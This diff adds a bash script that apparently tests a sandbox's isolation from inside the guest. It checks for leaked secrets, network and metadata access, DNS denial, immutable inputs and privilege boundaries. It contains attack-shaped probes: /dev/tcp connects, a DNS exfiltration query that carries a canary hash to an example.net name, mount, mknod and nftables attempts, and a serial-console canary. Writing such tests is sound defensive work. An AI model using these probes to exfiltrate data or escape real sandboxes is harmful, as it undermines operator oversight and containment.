@@ -1,0 +1,259 @@
+#!/usr/bin/env bash
+set -euo pipefail
+umask 077
+
+MANIFEST=${1:?hostile-test manifest required}
+CANARY_SHA256=${2:?canary SHA-256 required}
+OUTPUT=${3:?result path required}
+
+[[ "$MANIFEST" == /* && "$OUTPUT" == /* ]]
+[[ -f "$MANIFEST" && ! -L "$MANIFEST" ]]
+[[ "$CANARY_SHA256" =~ ^[0-9a-f]{64}$ ]]
+[[ ! -e "$OUTPUT" ]]
+jq -e '.schema_version == 1 and .session == 5' "$MANIFEST" >/dev/null
+
+RESULTS=$(mktemp /run/patchyard-session5-results.XXXXXX)
+cleanup() {
+  rm -f -- "$RESULTS"
+}
+trap cleanup EXIT
+
+record() {
+  local id=$1
+  local class=$2
+  local status=$3
+  local detail=$4
+  [[ "$id" =~ ^S5-[A-Z]+-[0-9]{3}$ ]]
+  [[ "$class" =~ ^[a-z_]+$ ]]
+  [[ "$status" == PASS || "$status" == FAIL ]]
+  [[ "$detail" =~ ^[a-z0-9_=-]+$ ]]
+  jq -nc \
+    --arg id "$id" \
+    --arg class "$class" \
+    --arg status "$status" \
+    --arg detail "$detail" \
+    '{id: $id, class: $class, status: $status, detail: $detail}' \
+    >>"$RESULTS"
+}
+
+targets() {
+  local id=$1
+  jq -r --arg id "$id" '.tests[] | select(.id == $id) | .targets[]' \
+    "$MANIFEST"
+}
+
+tcp_targets() {
+  local id=$1
+  jq -r --arg id "$id" \
+    '.tests[] | select(.id == $id) | .targets[] | [.host, .port] | @tsv' \
+    "$MANIFEST"
+}
+
+check_sensitive_environment_absent() {
+  local id=$1
+  local name
+  while IFS= read -r name; do
+    [[ -z "${!name+x}" ]] || return 1
+  done < <(targets "$id")
+  return 0
+}
+
+check_privileged_canary_absent() {
+  local id=$1
+  local target entry value value_sha
+  while IFS= read -r target; do
+    if [[ "$target" == /* ]]; then
+      [[ ! -e "$target" ]] || return 1
+    else
+      [[ -z "${!target+x}" ]] || return 1
+    fi
+  done < <(targets "$id")
+  while IFS= read -r -d '' entry; do
+    value=${entry#*=}
+    value_sha=$(printf '%s' "$value" | sha256sum | cut -d' ' -f1)
+    [[ "$value_sha" != "$CANARY_SHA256" ]] || return 1
+  done < <(env -0)
+  return 0
+}
+
+check_paths_absent() {
+  local id=$1
+  local path
+  while IFS= read -r path; do
+    [[ ! -e "$path" ]] || return 1
+  done < <(targets "$id")
+  return 0
+}
+
+check_op_surface_absent() {
+  local id=$1
+  check_paths_absent "$id" || return 1
+  ! command -v op >/dev/null 2>&1
+}
+
+check_sockets_absent() {
+  local id=$1
+  check_paths_absent "$id"
+}
+
+check_tcp_targets_denied() {
+  local id=$1
+  local host port
+  while IFS=$'\t' read -r host port; do
+    if timeout 3 bash -c "</dev/tcp/$host/$port" >/dev/null 2>&1; then
+      return 1
+    fi
+  done < <(tcp_targets "$id")
+  return 0
+}
+
+check_selected_provider_reachable() {
+  local id=$1
+  local url http_status
+  url=$(targets "$id")
+  [[ -n "$url" && "$(targets "$id" | wc -l)" -eq 1 ]]
+  http_status=$(curl --silent --show-error --output /dev/null \
+    --connect-timeout 4 --max-time 10 --write-out '%{http_code}' "$url" \
+    2>/dev/null || true)
+  [[ "$http_status" =~ ^[1-5][0-9][0-9]$ ]]
+}
+
+check_metadata_names_and_ipv6_denied() {
+  local id=$1
+  local target
+  while IFS= read -r target; do
+    if [[ "$target" == *:* ]]; then
+      timeout 3 bash -c "</dev/tcp/$target/80" >/dev/null 2>&1 \
+        && return 1
+    elif timeout 3 getent ahosts "$target" >/dev/null 2>&1; then
+      return 1
+    fi
+  done < <(targets "$id")
+  return 0
+}
+
+check_dns_names_denied() {
+  local id=$1
+  local name
+  while IFS= read -r name; do
+    timeout 3 getent ahosts "$name" >/dev/null 2>&1 && return 1
+  done < <(targets "$id")
+  return 0
+}
+
+check_direct_dns_denied() {
+  local id=$1
+  local resolver exfiltration_name
+  exfiltration_name="${CANARY_SHA256}.example.net"
+  while IFS= read -r resolver; do
+    timeout 4 dig +time=2 +tries=1 "@$resolver" "$exfiltration_name" A \
+      >/dev/null 2>&1 && return 1
+    timeout 4 dig +tcp +time=2 +tries=1 "@$resolver" "$exfiltration_name" A \
+      >/dev/null 2>&1 && return 1
+  done < <(targets "$id")
+  return 0
+}
+
+check_input_files_immutable() {
+  local id=$1
+  local path before after renamed
+  while IFS= read -r path; do
+    [[ -f "$path" && ! -L "$path" ]] || return 1
+    before=$(sha256sum "$path" | cut -d' ' -f1)
+    if printf 'x' >>"$path" 2>/dev/null; then return 1; fi
+    if chmod 0600 "$path" 2>/dev/null; then return 1; fi
+    renamed="${path}.session5-renamed"
+    if mv "$path" "$renamed" 2>/dev/null; then return 1; fi
+    if rm "$path" 2>/dev/null; then return 1; fi
+    after=$(sha256sum "$path" | cut -d' ' -f1)
+    [[ "$before" == "$after" ]] || return 1
+  done < <(targets "$id")
+  if touch /input/session5-created 2>/dev/null; then
+    return 1
+  fi
+  return 0
+}
+
+check_host_paths_absent() {
+  local id=$1
+  local path
+  while IFS= read -r path; do
+    [[ ! -e "$path" ]] || return 1
+  done < <(targets "$id")
+
+  install -d -m 0700 /tmp/session5-boundary
+  if mount -t tmpfs tmpfs /tmp/session5-boundary >/dev/null 2>&1; then
+    touch /tmp/session5-boundary/guest-local
+    umount /tmp/session5-boundary
+  fi
+  if mknod /tmp/session5-device c 10 232 >/dev/null 2>&1; then
+    rm -f -- /tmp/session5-device
+  fi
+  if command -v nft >/dev/null 2>&1 \
+    && nft add table inet session5_guest_local >/dev/null 2>&1; then
+    nft delete table inet session5_guest_local >/dev/null 2>&1 || true
+  fi
+  rmdir /tmp/session5-boundary
+  return 0
+}
+
+while IFS=$'\t' read -r id class assertion; do
+  status=FAIL
+  case "$assertion" in
+    sensitive_environment_absent)
+      check_sensitive_environment_absent "$id" && status=PASS
+      ;;
+    privileged_canary_absent)
+      check_privileged_canary_absent "$id" && status=PASS
+      ;;
+    paths_absent)
+      check_paths_absent "$id" && status=PASS
+      ;;
+    op_surface_absent)
+      check_op_surface_absent "$id" && status=PASS
+      ;;
+    sockets_absent)
+      check_sockets_absent "$id" && status=PASS
+      ;;
+    tcp_targets_denied)
+      check_tcp_targets_denied "$id" && status=PASS
+      ;;
+    selected_provider_reachable)
+      check_selected_provider_reachable "$id" && status=PASS
+      ;;
+    metadata_names_and_ipv6_denied)
+      check_metadata_names_and_ipv6_denied "$id" && status=PASS
+      ;;
+    dns_names_denied)
+      check_dns_names_denied "$id" && status=PASS
+      ;;
+    direct_dns_denied)
+      check_direct_dns_denied "$id" && status=PASS
+      ;;
+    input_files_immutable)
+      check_input_files_immutable "$id" && status=PASS
+      ;;
+    host_paths_absent)
+      check_host_paths_absent "$id" && status=PASS
+      ;;
+    *)
+      status=FAIL
+      ;;
+  esac
+  target_count=$(jq --arg id "$id" \
+    '[.tests[] | select(.id == $id) | .targets[]] | length' "$MANIFEST")
+  record "$id" "$class" "$status" "targets=${target_count}"
+done < <(jq -r \
+  '.tests[] | select(.executor == "guest") | [.id, .class, .assertion] | @tsv' \
+  "$MANIFEST")
+
+jq -s 'sort_by(.id)' "$RESULTS" >"$OUTPUT"
+EXPECTED_IDS=$(jq -c '[.tests[] | select(.executor == "guest") | .id] | sort' \
+  "$MANIFEST")
+ACTUAL_IDS=$(jq -c '[.[].id] | sort' "$OUTPUT")
+[[ "$ACTUAL_IDS" == "$EXPECTED_IDS" ]]
+jq -e 'all(.status == "PASS")' "$OUTPUT" >/dev/null
+
+# This guest-controlled marker exercises the serial-console alternate channel.
+# The control boundary must prove it reaches neither operator output nor artifacts.
+printf 'session5-console-canary=%s\n' "$CANARY_SHA256" >/dev/ttyS0
